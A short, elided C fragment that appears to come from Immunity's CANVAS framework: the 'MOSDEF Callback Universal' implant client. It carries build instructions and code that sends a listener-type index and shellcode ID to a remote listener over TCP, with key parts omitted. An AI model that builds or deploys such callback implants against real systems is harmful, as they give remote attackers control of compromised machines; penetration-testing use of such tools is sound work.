//MOSDEF Callback Universal
//(C) Immunity, Inc.
//gcc -o mosdef_callback_universal tcpstuff.c utils.c mosdef_callback_universal.c -D__linux__ -D__i386__ -m32
//
//WARNING:
//for building on a 64 bit linux you may need to install some support packages!
//On fedora:  yum install compat-libstdc++-33 compat-libstdc++-296 glibc-devel.i386
#include <stdio.h>
#include <stdlib.h>
...
main(int argc, char**argv)
{
  ...
  /* Now send our universal TYPEINFO */
  memset(buf, 0, sizeof(buf));
  *(int*)buf = htonl(3); /* The index into canvasengine.py's list of listener types */
  tcpwrite(fd, 4, buf);

  /*now send our shellcode ID */
  *(int*)buf = htonl(0); /* Our ID is none */
  tcpwrite(fd, 4, buf);
